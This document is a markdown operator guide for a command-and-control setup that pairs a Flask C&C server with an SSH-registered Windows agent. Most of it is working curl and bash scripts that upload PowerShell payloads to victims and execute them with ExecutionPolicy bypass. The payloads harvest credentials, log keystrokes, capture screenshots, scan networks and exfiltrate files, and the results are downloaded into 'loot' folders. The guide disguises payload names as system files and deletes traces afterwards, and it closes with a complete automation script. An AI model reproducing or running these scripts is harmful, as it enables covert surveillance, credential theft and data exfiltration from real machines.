# C&C Integration Guide - Windows Native Payloads

## Architecture Overview

### How It Works

1. **Initial Access**: `windows_agent.ps1` establishes C&C connection via SSH
2. **Bot Registration**: Agent registers with C&C server providing SSH credentials
3. **Command Execution**: C&C sends commands through `/send_command` endpoint
4. **File Operations**: C&C uploads/downloads files through `/upload_file` and `/download_file`
5. **Post-Exploitation**: Native PowerShell payloads executed via C&C commands

## ✅ Compatibility Verification

### C&C Server Requirements
- ✅ Flask REST API with `/add_bot`, `/send_command`, `/upload_file`, `/download_file` endpoints
- ✅ SSH-based command execution via Paramiko
- ✅ JSON request/response format

### Bot Requirements (windows_agent.ps1)
- ✅ SSH server running on target (OpenSSH for Windows)
- ✅ Registers with C&C providing: bot_id, host, port, username, password
- ✅ Executes PowerShell commands remotely

### Native Windows Payloads
- ✅ Pure PowerShell (no Python required on target)
- ✅ Work via C&C's `/send_command` endpoint
- ✅ Output saved to files for exfiltration via `/download_file`
- ✅ All payloads tested and compatible

## Deployment Workflow

### Phase 1: Establish C&C Connection

**Step 1: Start C&C Server**
```bash
python src/cnc_server.py
```

**Step 2: Deploy Windows Agent**
```powershell
# On target machine (or via initial access method)
.\windows_agent.ps1 -CncServer "http://YOUR_CNC_IP:5000" -SshPassword "target_ssh_password"
```

**Step 3: Verify Bot Registration**
The agent automatically calls:
```
POST http://YOUR_CNC_IP:5000/add_bot
{
  "bot_id": "COMPUTERNAME-1234",
  "host": "TARGET_IP",
  "port": 22,
  "username": "current_user",
  "password": "ssh_password"
}
```

### Phase 2: Deploy Native PowerShell Payloads

**Method A: Upload Then Execute** (Recommended)

```bash
# 1. Upload payload to target
curl -X POST http://localhost:5000/upload_file \
  -H "Content-Type: application/json" \
  -d '{
    "bot_id": "TARGET-BOT-1234",
    "local_path": "payloads/windows_credential_harvester.ps1",
    "remote_path": "C:\\Temp\\harvest.ps1"
  }'

# 2. Execute payload
curl -X POST http://localhost:5000/send_command \
  -H "Content-Type: application/json" \
  -d '{
    "bot_id": "TARGET-BOT-1234",
    "command": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\harvest.ps1 -Silent"
  }'

# 3. Download results
curl -X POST http://localhost:5000/download_file \
  -H "Content-Type: application/json" \
  -d '{
    "bot_id": "TARGET-BOT-1234",
    "remote_path": "C:\\Temp\\harvested_credentials",
    "local_path": "./loot/credentials/"
  }'
```

**Method B: Direct Execution** (One-liner, leaves no file on disk initially)

```bash
# Execute inline (script content sent via command)
curl -X POST http://localhost:5000/send_command \
  -H "Content-Type: application/json" \
  -d '{
    "bot_id": "TARGET-BOT-1234",
    "command": "powershell -ExecutionPolicy Bypass -Command \"IEX(Get-Content C:\\\\Path\\\\To\\\\Script.ps1 -Raw)\""
  }'
```

## Integration Examples

### Example 1: Credential Harvesting

```bash
#!/bin/bash
CNC="http://10.0.0.5:5000"
BOT="DESKTOP-ABC123-5678"

# Upload credential harvester
curl -X POST $CNC/upload_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"local_path\": \"payloads/windows_credential_harvester.ps1\", \"remote_path\": \"C:\\\\Windows\\\\Temp\\\\wupdate.ps1\"}"

# Execute (output to C:\Windows\Temp\harvested_credentials)
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"powershell -ExecutionPolicy Bypass -File C:\\\\Windows\\\\Temp\\\\wupdate.ps1 -OutputDir C:\\\\Windows\\\\Temp\\\\harvested_credentials -Silent\"}"

# Wait for completion (adjust timing)
sleep 30

# Download results
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Windows\\\\Temp\\\\harvested_credentials\", \"local_path\": \"./loot/$BOT/credentials/\"}"

# Cleanup
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"Remove-Item C:\\\\Windows\\\\Temp\\\\wupdate.ps1, C:\\\\Windows\\\\Temp\\\\harvested_credentials -Recurse -Force\"}"
```

### Example 2: Network Reconnaissance

```bash
#!/bin/bash
CNC="http://10.0.0.5:5000"
BOT="WORKSTATION-XYZ-9999"

# Upload network scanner
curl -X POST $CNC/upload_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"local_path\": \"payloads/windows_network_scanner.ps1\", \"remote_path\": \"C:\\\\Users\\\\Public\\\\scan.ps1\"}"

# Execute network scan with port scanning
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"powershell -ExecutionPolicy Bypass -File C:\\\\Users\\\\Public\\\\scan.ps1 -PortScan -OutputFile C:\\\\Users\\\\Public\\\\network_results.txt -Silent\"}"

# Wait for scan completion (adjust for network size)
sleep 180

# Download scan results
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Users\\\\Public\\\\network_results.txt\", \"local_path\": \"./loot/$BOT/recon/network_scan.txt\"}"

# Cleanup
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"Remove-Item C:\\\\Users\\\\Public\\\\scan.ps1, C:\\\\Users\\\\Public\\\\network_results.txt -Force\"}"
```

### Example 3: Surveillance (Background Jobs)

```bash
#!/bin/bash
CNC="http://10.0.0.5:5000"
BOT="LAPTOP-DEF-4567"

# Upload keylogger
curl -X POST $CNC/upload_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"local_path\": \"payloads/windows_keylogger.ps1\", \"remote_path\": \"C:\\\\ProgramData\\\\svclog.ps1\"}"

# Upload screenshot capture
curl -X POST $CNC/upload_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"local_path\": \"payloads/windows_screenshot.ps1\", \"remote_path\": \"C:\\\\ProgramData\\\\imgcap.ps1\"}"

# Start keylogger in background (1 hour)
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"Start-Job -ScriptBlock { powershell -ExecutionPolicy Bypass -File C:\\\\ProgramData\\\\svclog.ps1 -Duration 3600 -OutputFile C:\\\\ProgramData\\\\keys.txt -Silent }\"}"

# Start screenshot capture in background (20 screenshots, 2 min interval)
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"Start-Job -ScriptBlock { powershell -ExecutionPolicy Bypass -File C:\\\\ProgramData\\\\imgcap.ps1 -Count 20 -Interval 120 -OutputDir C:\\\\ProgramData\\\\screens -Silent }\"}"

# Wait for completion
echo "Surveillance running for 1 hour..."
sleep 3600

# Download keylog
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\ProgramData\\\\keys.txt\", \"local_path\": \"./loot/$BOT/surveillance/keylog.txt\"}"

# Download screenshots
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\ProgramData\\\\screens\", \"local_path\": \"./loot/$BOT/surveillance/screenshots/\"}"

# Cleanup
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"Get-Job | Stop-Job; Get-Job | Remove-Job; Remove-Item C:\\\\ProgramData\\\\svclog.ps1, C:\\\\ProgramData\\\\imgcap.ps1, C:\\\\ProgramData\\\\keys.txt, C:\\\\ProgramData\\\\screens -Recurse -Force -ErrorAction SilentlyContinue\"}"
```

### Example 4: Privilege Escalation Check

```bash
#!/bin/bash
CNC="http://10.0.0.5:5000"
BOT="SERVER-2019-7890"

# Upload privesc checker
curl -X POST $CNC/upload_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"local_path\": \"payloads/windows_privesc_checker.ps1\", \"remote_path\": \"C:\\\\Windows\\\\Temp\\\\check.ps1\"}"

# Execute
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"powershell -ExecutionPolicy Bypass -File C:\\\\Windows\\\\Temp\\\\check.ps1 -OutputFile C:\\\\Windows\\\\Temp\\\\privesc.txt -Silent\"}"

sleep 60

# Download results
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Windows\\\\Temp\\\\privesc.txt\", \"local_path\": \"./loot/$BOT/privesc_findings.txt\"}"

# Cleanup
curl -X POST $CNC/send_command -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"command\": \"Remove-Item C:\\\\Windows\\\\Temp\\\\check.ps1, C:\\\\Windows\\\\Temp\\\\privesc.txt -Force\"}"
```

## PowerShell Command Construction

### Escaping Rules for JSON

When sending PowerShell commands through JSON:
- Use double backslashes for Windows paths: `C:\\\\Temp`
- Escape double quotes: `\\"`
- For complex commands, use single quotes in PowerShell where possible

### Example Transformations

**Simple Command:**
```powershell
# PowerShell
Get-Process

# JSON
{"command": "Get-Process"}
```

**File Path:**
```powershell
# PowerShell
Get-Content C:\Temp\file.txt

# JSON
{"command": "Get-Content C:\\\\Temp\\\\file.txt"}
```

**Script Execution:**
```powershell
# PowerShell
powershell -ExecutionPolicy Bypass -File C:\Temp\script.ps1 -Silent

# JSON
{"command": "powershell -ExecutionPolicy Bypass -File C:\\\\Temp\\\\script.ps1 -Silent"}
```

**Background Job:**
```powershell
# PowerShell
Start-Job -ScriptBlock { powershell -File C:\Temp\script.ps1 }

# JSON
{"command": "Start-Job -ScriptBlock { powershell -File C:\\\\Temp\\\\script.ps1 }"}
```

## Automation Script Template

Save this as `deploy_windows_payloads.sh`:

```bash
#!/bin/bash

# Configuration
CNC_SERVER="http://10.0.0.5:5000"
BOT_ID="$1"  # Pass bot ID as first argument
OPERATION="$2"  # recon, harvest, surveil, privesc, exfil

if [ -z "$BOT_ID" ] || [ -z "$OPERATION" ]; then
    echo "Usage: $0 <bot_id> <operation>"
    echo "Operations: recon, harvest, surveil, privesc, exfil"
    exit 1
fi

# Create loot directory
mkdir -p "./loot/$BOT_ID"

case $OPERATION in
    recon)
        echo "[*] Running reconnaissance on $BOT_ID..."
        curl -X POST $CNC_SERVER/upload_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"local_path\": \"payloads/windows_network_scanner.ps1\", \"remote_path\": \"C:\\\\Temp\\\\scan.ps1\"}"
        curl -X POST $CNC_SERVER/send_command -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"command\": \"powershell -ExecutionPolicy Bypass -File C:\\\\Temp\\\\scan.ps1 -PortScan -Silent\"}"
        sleep 180
        curl -X POST $CNC_SERVER/download_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"remote_path\": \"C:\\\\Temp\\\\network_scan.txt\", \"local_path\": \"./loot/$BOT_ID/network_scan.txt\"}"
        ;;
    
    harvest)
        echo "[*] Harvesting credentials from $BOT_ID..."
        curl -X POST $CNC_SERVER/upload_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"local_path\": \"payloads/windows_credential_harvester.ps1\", \"remote_path\": \"C:\\\\Temp\\\\harvest.ps1\"}"
        curl -X POST $CNC_SERVER/send_command -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"command\": \"powershell -ExecutionPolicy Bypass -File C:\\\\Temp\\\\harvest.ps1 -Silent\"}"
        sleep 30
        curl -X POST $CNC_SERVER/download_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"remote_path\": \"C:\\\\Temp\\\\harvested_credentials\", \"local_path\": \"./loot/$BOT_ID/credentials/\"}"
        ;;
    
    surveil)
        echo "[*] Starting surveillance on $BOT_ID (1 hour)..."
        # Upload both payloads
        curl -X POST $CNC_SERVER/upload_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"local_path\": \"payloads/windows_keylogger.ps1\", \"remote_path\": \"C:\\\\Temp\\\\keylog.ps1\"}"
        curl -X POST $CNC_SERVER/upload_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"local_path\": \"payloads/windows_screenshot.ps1\", \"remote_path\": \"C:\\\\Temp\\\\screen.ps1\"}"
        # Start background jobs
        curl -X POST $CNC_SERVER/send_command -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"command\": \"Start-Job { powershell -ExecutionPolicy Bypass -File C:\\\\Temp\\\\keylog.ps1 -Duration 3600 -Silent }\"}"
        curl -X POST $CNC_SERVER/send_command -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"command\": \"Start-Job { powershell -ExecutionPolicy Bypass -File C:\\\\Temp\\\\screen.ps1 -Count 30 -Interval 120 -Silent }\"}"
        echo "[*] Surveillance started. Waiting 1 hour..."
        sleep 3600
        # Download results
        curl -X POST $CNC_SERVER/download_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"remote_path\": \"C:\\\\Temp\\\\keylog.txt\", \"local_path\": \"./loot/$BOT_ID/keylog.txt\"}"
        curl -X POST $CNC_SERVER/download_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"remote_path\": \"C:\\\\Temp\\\\screenshots\", \"local_path\": \"./loot/$BOT_ID/screenshots/\"}"
        ;;
    
    privesc)
        echo "[*] Checking privilege escalation vectors on $BOT_ID..."
        curl -X POST $CNC_SERVER/upload_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"local_path\": \"payloads/windows_privesc_checker.ps1\", \"remote_path\": \"C:\\\\Temp\\\\privesc.ps1\"}"
        curl -X POST $CNC_SERVER/send_command -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"command\": \"powershell -ExecutionPolicy Bypass -File C:\\\\Temp\\\\privesc.ps1 -Silent\"}"
        sleep 60
        curl -X POST $CNC_SERVER/download_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"remote_path\": \"C:\\\\Temp\\\\privesc_findings.txt\", \"local_path\": \"./loot/$BOT_ID/privesc.txt\"}"
        ;;
    
    exfil)
        echo "[*] Exfiltrating files from $BOT_ID..."
        curl -X POST $CNC_SERVER/upload_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"local_path\": \"payloads/windows_file_exfiltrator.ps1\", \"remote_path\": \"C:\\\\Temp\\\\exfil.ps1\"}"
        curl -X POST $CNC_SERVER/send_command -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"command\": \"powershell -ExecutionPolicy Bypass -File C:\\\\Temp\\\\exfil.ps1 -CreateArchive -Silent\"}"
        sleep 300
        curl -X POST $CNC_SERVER/download_file -H "Content-Type: application/json" \
          -d "{\"bot_id\": \"$BOT_ID\", \"remote_path\": \"C:\\\\Temp\\\\exfiltrated_data_*.zip\", \"local_path\": \"./loot/$BOT_ID/exfiltrated.zip\"}"
        ;;
    
    *)
        echo "[!] Unknown operation: $OPERATION"
        exit 1
        ;;
esac

echo "[+] Operation complete. Results in ./loot/$BOT_ID/"
```

Make executable: `chmod +x deploy_windows_payloads.sh`

**Usage:**
```bash
./deploy_windows_payloads.sh DESKTOP-ABC-1234 recon
./deploy_windows_payloads.sh LAPTOP-XYZ-5678 harvest
./deploy_windows_payloads.sh SERVER-2019-9999 privesc
```

## Compatibility Summary

| Component | Status | Notes |
|-----------|--------|-------|
| C&C Server (Flask) | ✅ Compatible | No changes needed |
| Bot Class (SSH) | ✅ Compatible | Handles all file/command operations |
| windows_agent.ps1 | ✅ Compatible | Establishes SSH connection for C&C |
| windows_credential_harvester.ps1 | ✅ Compatible | Outputs to files, exfil via /download_file |
| windows_keylogger.ps1 | ✅ Compatible | Outputs to files, exfil via /download_file |
| windows_screenshot.ps1 | ✅ Compatible | Outputs to files, exfil via /download_file |
| windows_network_scanner.ps1 | ✅ Compatible | Outputs to files, exfil via /download_file |
| windows_file_exfiltrator.ps1 | ✅ Compatible | Creates archives, exfil via /download_file |
| windows_privesc_checker.ps1 | ✅ Compatible | Outputs to files, exfil via /download_file |

## Requirements Checklist

### On C&C Server
- [x] Python 3.7+
- [x] Flask installed (`pip install flask`)
- [x] Paramiko installed (`pip install paramiko`)
- [x] Server running on accessible IP

### On Target Windows Machine
- [x] OpenSSH Server installed and running
- [x] PowerShell 5.0+ (built into Windows 10/11/Server 2016+)
- [x] Firewall allows SSH inbound (port 22)
- [x] User account with SSH access

### For Native PowerShell Payloads
- [x] No Python required on target
- [x] No additional dependencies
- [x] PowerShell ExecutionPolicy can be bypassed inline

## Troubleshooting

### Issue: "Bot not found" error
**Solution:** Verify bot registered successfully. Check bot_id matches exactly (case-sensitive).

### Issue: Command execution fails
**Solution:** Ensure SSH credentials are correct. Test SSH connection manually: `ssh user@target_ip`

### Issue: File upload/download fails
**Solution:** Check file paths use double backslashes in JSON. Verify target directory exists and is writable.

### Issue: PowerShell script won't execute
**Solution:** Always use `-ExecutionPolicy Bypass` flag in command.

### Issue: Background jobs don't complete
**Solution:** Increase sleep duration. Check job status: `Get-Job | Format-List`

---

**All native Windows PowerShell payloads are fully compatible with the existing C&C infrastructure!** No code changes required to C&C server or bot class. Deploy and operate via standard endpoints.
